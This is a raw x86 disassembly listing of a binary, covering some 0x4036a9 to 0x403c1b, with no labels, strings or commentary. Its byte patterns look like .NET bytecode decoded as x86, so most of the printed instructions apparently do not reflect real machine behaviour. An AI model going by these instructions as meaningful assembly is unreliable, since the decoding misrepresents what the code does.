  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 3e             	es jb  0x403710
  4036d2:	24 00                	and    $0x0,%al
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	50                   	push   %eax
  40372d:	24 00                	and    $0x0,%al
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 56                	jb     0x4037d0
  40377a:	24 00                	and    $0x0,%al
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 6c 24 00       	and    $0x246c72,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 76 24 00       	and    $0x247672,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 80 24 00       	and    $0x248072,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 86                	jb     0x403753
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 9a             	or     -0x66(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	9e                   	sahf
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	a8 24                	test   $0x24,%al
  4037f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 b4             	or     -0x4c(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	c0 24 00 70          	shlb   $0x70,(%eax,%eax,1)
  403801:	6f                   	outsl  %ds:(%esi),(%dx)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 cc 24 00       	and    $0x24cc72,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 d6 24 00       	and    $0x24d672,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 e6 24 00       	and    $0x24e672,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 f2             	or     -0xe(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	e6 24                	out    %al,$0x24
  40385f:	00 70 6f             	add    %dh,0x6f(%eax)
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 fc             	or     -0x4(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	76 24                	jbe    0x403892
  40386e:	00 70 6f             	add    %dh,0x6f(%eax)
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 08 25 00       	and    $0x250872,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 20 25 00       	and    $0x252072,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 32 25 00       	and    $0x253272,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 46 25 00       	and    $0x254672,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 5a 25 00       	and    $0x255a72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 b4                	jb     0x4038a9
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 64 25 00       	and    $0x256472,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 70             	adc    %esi,0x70(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 76             	or     0x76(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 a2             	or     -0x5e(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 e0    	or     0xe0720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 f8                	jb     0x403a0e
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 00             	add    %dh,0x0(%edx)
  403a22:	26 00 70 07          	add    %dh,%es:0x7(%eax)
  403a26:	6f                   	outsl  %ds:(%esi),(%dx)
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 f8                	jb     0x403a3f
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 b4             	add    %dh,-0x4c(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
